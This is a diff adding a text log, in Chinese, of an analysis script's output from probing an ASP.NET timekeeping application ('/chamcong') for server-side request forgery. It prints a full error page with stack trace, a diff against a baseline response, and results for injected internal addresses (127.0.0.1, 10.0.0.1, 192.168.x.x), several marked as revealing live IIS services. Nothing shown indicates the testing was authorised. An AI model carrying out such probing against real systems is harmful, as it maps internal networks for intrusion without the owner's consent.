@@ -1,0 +1,257 @@
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔍 分析SSRF响应内容
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[1] 分析127.0.0.1响应
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  文件大小: 8048 bytes
+
+  响应内容:
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Could not find a part of the path 'C:\TEMP\127.0.0.1\share\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.</title>
+        <meta name="viewport" content="width=device-width" />
+        <style>
+         body {font-family:"Verdana";font-weight:normal;font-size: .7em;color:black;} 
+         p {font-family:"Verdana";font-weight:normal;color:black;margin-top: -5px}
+         b {font-family:"Verdana";font-weight:bold;color:black;margin-top: -5px}
+         H1 { font-family:"Verdana";font-weight:normal;font-size:18pt;color:red }
+         H2 { font-family:"Verdana";font-weight:normal;font-size:14pt;color:maroon }
+         pre {font-family:"Consolas","Lucida Console",Monospace;font-size:11pt;margin:0;padding:0.5em;line-height:14pt}
+         .marker {font-weight: bold; color: black;text-decoration: none;}
+         .version {color: gray;}
+         .error {margin-bottom: 10px;}
+         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:pointer; }
+         @media screen and (max-width: 639px) {
+          pre { width: 440px; overflow: auto; white-space: pre-wrap; word-wrap: break-word; }
+         }
+         @media screen and (max-width: 479px) {
+          pre { width: 280px; }
+         }
+        </style>
+    </head>
+
+    <body bgcolor="white">
+
+            <span><H1>Server Error in '/chamcong' Application.<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>Could not find a part of the path 'C:\TEMP\127.0.0.1\share\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.</i> </h2></span>
+
+            <font face="Arial, Helvetica, Geneva, SunSans-Regular, sans-serif ">
+
+            <b> Description: </b>An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.
+
+            <br><br>
+
+            <b> Exception Details: </b>System.IO.DirectoryNotFoundException: Could not find a part of the path 'C:\TEMP\127.0.0.1\share\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.<br><br>
+
+            <b>Source Error:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code>
+
+An unhandled exception was generated during the execution of the current web request. Information regarding the origin and location of the exception can be identified using the exception stack trace below.                      </code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <b>Stack Trace:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+[DirectoryNotFoundException: Could not find a part of the path &#39;C:\TEMP\127.0.0.1\share\test2025_BC01_KVMB_KVMBTCVP  _BC_DT.xls&#39;.]
+   System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath) +373
+   System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean bFromProxy, Boolean useLongPath, Boolean checkHost) +738
+   System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options, String msgPath, Boolean bFromProxy, Boolean useLongPath, Boolean checkHost) +68
+   System.IO.StreamWriter.CreateFile(String path, Boolean append, Boolean checkHost) +76
+   System.IO.StreamWriter..ctor(String path, Boolean append, Encoding encoding, Int32 bufferSize, Boolean checkHost) +75
+   System.IO.StreamWriter..ctor(String path) +36
+   ImportExport.exportToExcel(DataSet source, String fileName) +61
+   report_inBCC.XuatFileBC(String pkyluong, String pmadv, String pmabp, String pmato, String pMauBC) +971
+   report_inBCC.btnExport_Click(Object sender, EventArgs e) +855
+   System.Web.UI.WebControls.Button.OnClick(EventArgs e) +9804418
+   System.Web.UI.WebControls.Button.RaisePostBackEvent(String eventArgument) +211
+   System.Web.UI.WebControls.Button.System.Web.UI.IPostBackEventHandler.RaisePostBackEvent(String eventArgument) +12
+   System.Web.UI.Page.RaisePostBackEvent(IPostBackEventHandler sourceControl, String eventArgument) +15
+   System.Web.UI.Page.RaisePostBackEvent(NameValueCollection postData) +35
+   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +1696
+</pre>                      </code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <hr width=100% size=1 color=silver>
+
+            <b>Version Information:</b>&nbsp;Microsoft .NET Framework Version:4.0.30319; ASP.NET Version:4.8.4797.0
+
+            </font>
+
+    </body>
+</html>
+<!-- 
+[DirectoryNotFoundException]: Could not find a part of the path &#39;C:\TEMP\127.0.0.1\share\test2025_BC01_KVMB_KVMBTCVP  _BC_DT.xls&#39;.
+   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
+   at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean bFromProxy, Boolean useLongPath, Boolean checkHost)
+   at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options, String msgPath, Boolean bFromProxy, Boolean useLongPath, Boolean checkHost)
+   at System.IO.StreamWriter.CreateFile(String path, Boolean append, Boolean checkHost)
+   at System.IO.StreamWriter..ctor(String path, Boolean append, Encoding encoding, Int32 bufferSize, Boolean checkHost)
+
+  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  关键信息提取:
+    尝试的路径:
+Could not find a part of the path 'C:\TEMP\127.0.0.1\share\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'
+Could not find a part of the path 'C:\TEMP\127.0.0.1\share\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'
+Could not find a part of the path 'C:\TEMP\127.0.0.1\share\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'
+
+    发现的主机名/IP:
+127.0.0.1
+127.0.0.1
+127.0.0.1
+127.0.0.1
+127.0.0.1
+
+    错误类型:
+         .error {margin-bottom: 10px;}
+            <span><H1>Server Error in '/chamcong' Application.<hr width=100% size=1 color=silver></H1>
+            <b> Description: </b>An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.
+            <b> Exception Details: </b>System.IO.DirectoryNotFoundException: Could not find a part of the path 'C:\TEMP\127.0.0.1\share\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.<br><br>
+            <b>Source Error:</b> <br><br>
+
+[2] 对比正常响应和SSRF响应
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  获取正常基线...
+    正常响应: 7958 bytes
+    SSRF响应: 8048 bytes
+    差异: 90 bytes
+
+  差异内容:
+4c4
+<         <title>Could not find a part of the path 'C:\TEMP\112025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.</title>
+---
+>         <title>Could not find a part of the path 'C:\TEMP\127.0.0.1\share\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.</title>
+30c30
+<             <h2> <i>Could not find a part of the path 'C:\TEMP\112025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.</i> </h2></span>
+---
+>             <h2> <i>Could not find a part of the path 'C:\TEMP\127.0.0.1\share\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.</i> </h2></span>
+38c38
+<             <b> Exception Details: </b>System.IO.DirectoryNotFoundException: Could not find a part of the path 'C:\TEMP\112025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.<br><br>
+---
+>             <b> Exception Details: </b>System.IO.DirectoryNotFoundException: Could not find a part of the path 'C:\TEMP\127.0.0.1\share\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls'.<br><br>
+
+[3] 分析所有SSRF响应文件
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  ssrf_10_0_0_1.html: 8043 bytes
+    ⚠️  目录不存在
+    尝试路径: C:\TEMP\10.0.0.1\share\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  ssrf_127_0_0_1.html: 8048 bytes
+    ⚠️  目录不存在
+    尝试路径: C:\TEMP\127.0.0.1\share\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  ssrf_172_16_0_1.html: 8053 bytes
+    ⚠️  目录不存在
+    尝试路径: C:\TEMP\172.16.0.1\share\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  ssrf_192_168_0_1.html: 8058 bytes
+    ⚠️  目录不存在
+    尝试路径: C:\TEMP\192.168.0.1\share\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  ssrf_192_168_1_100.html: 8068 bytes
+    ⚠️  目录不存在
+    尝试路径: C:\TEMP\192.168.1.100\share\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  ssrf_192_168_1_10.html: 8063 bytes
+    ⚠️  目录不存在
+    尝试路径: C:\TEMP\192.168.1.10\share\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  ssrf_192_168_1_1.html: 8058 bytes
+    ⚠️  目录不存在
+    尝试路径: C:\TEMP\192.168.1.1\share\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  ssrf_localhost.html: 8048 bytes
+    ⚠️  目录不存在
+    尝试路径: C:\TEMP\localhost\share\test2025_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  ssrf_service_0df7c804adb8ae0c877c2426e73fd9e2.html: 7765 bytes
+    🔥 权限拒绝（主机/服务存在！）
+
+  ssrf_service_2885a74f2fe96928e47439b551c806f2.html: 7765 bytes
+    🔥 权限拒绝（主机/服务存在！）
+
+  ssrf_service_4ed59a14acabe2177ff9594f58ce0930.html: 7765 bytes
+    🔥 权限拒绝（主机/服务存在！）
+
+  ssrf_service_9d951104d4c3d1977e81579952f2390c.html: 7765 bytes
+    🔥 权限拒绝（主机/服务存在！）
+
+  ssrf_service_a8968a71aa63b960d7827e2295096686.html: 7765 bytes
+    🔥 权限拒绝（主机/服务存在！）
+
+  ssrf_service_bc9113f37e91c144c38f24b2cb906e38.html: 7765 bytes
+    🔥 权限拒绝（主机/服务存在！）
+
+  ssrf_service_d1f516729f0968868edeb478489080a0.html: 7765 bytes
+    🔥 权限拒绝（主机/服务存在！）
+
+  ssrf_service_f00960e7660c0f6e1213da9da7112dcd.html: 7765 bytes
+    🔥 权限拒绝（主机/服务存在！）
+
+  ssrf_service_f7717ce0cddda86981347dc540119c8d.html: 7765 bytes
+    🔥 权限拒绝（主机/服务存在！）
+
+[4] HTTP服务探测结果分析
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  ssrf_service_0df7c804adb8ae0c877c2426e73fd9e2.html: 7765 bytes
+    🔥 IIS服务
+    标题: The given path's format is not supported.
+
+  ssrf_service_2885a74f2fe96928e47439b551c806f2.html: 7765 bytes
+    🔥 IIS服务
+    标题: The given path's format is not supported.
+
+  ssrf_service_4ed59a14acabe2177ff9594f58ce0930.html: 7765 bytes
+    🔥 IIS服务
+    标题: The given path's format is not supported.
+
+  ssrf_service_9d951104d4c3d1977e81579952f2390c.html: 7765 bytes
+    🔥 IIS服务
+    标题: The given path's format is not supported.
+
+  ssrf_service_a8968a71aa63b960d7827e2295096686.html: 7765 bytes
+    🔥 IIS服务
+    标题: The given path's format is not supported.
+
+  ssrf_service_bc9113f37e91c144c38f24b2cb906e38.html: 7765 bytes
+    🔥 IIS服务
+    标题: The given path's format is not supported.
+
+  ssrf_service_d1f516729f0968868edeb478489080a0.html: 7765 bytes
+    🔥 IIS服务
+    标题: The given path's format is not supported.
+
+  ssrf_service_f00960e7660c0f6e1213da9da7112dcd.html: 7765 bytes
+    🔥 IIS服务
+    标题: The given path's format is not supported.
+
+  ssrf_service_f7717ce0cddda86981347dc540119c8d.html: 7765 bytes
+    🔥 IIS服务
+    标题: The given path's format is not supported.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ 分析完成
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
